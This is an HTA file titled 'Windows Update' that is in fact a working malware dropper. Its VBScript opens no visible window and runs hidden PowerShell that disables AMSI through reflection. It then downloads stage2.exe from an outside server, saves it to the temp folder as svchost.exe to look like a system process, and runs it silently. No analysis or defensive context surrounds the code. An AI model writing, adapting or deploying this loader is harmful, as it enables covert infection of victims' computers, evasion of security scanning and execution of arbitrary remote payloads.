<html>
<head>
<title>Windows Update</title>
<HTA:APPLICATION ID="oHTA" 
    APPLICATIONNAME="updater" 
    BORDER="none" 
    CAPTION="no" 
    SHOWINTASKBAR="no" 
    SINGLEINSTANCE="yes" 
    SYSMENU="no" 
    WINDOWSTATE="minimize" 
/>
<script language="VBScript">
    On Error Resume Next
    Dim wsh, cmd, http, stream, tempPath
    
    Set wsh = CreateObject("WScript.Shell")
    
    ' AMSI Bypass (Reflection)
    cmd = "powershell -w hidden -c ""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"""
    wsh.Run cmd, 0, True
    
    ' Download Stage 2 via WinHttp (Less signatured than MSXML2)
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", "https://dicerigx.app/stage2.exe", False
    http.Send
    
    If http.Status = 200 Then
        tempPath = wsh.ExpandEnvironmentStrings("%TEMP%") & "\svchost.exe"
        
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' Binary
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile tempPath, 2
        stream.Close
        
        ' Execute the dropped payload
        wsh.Run tempPath, 0, False
    End If
    
    window.close
</script>
</head>
<body>
</body>
</html>
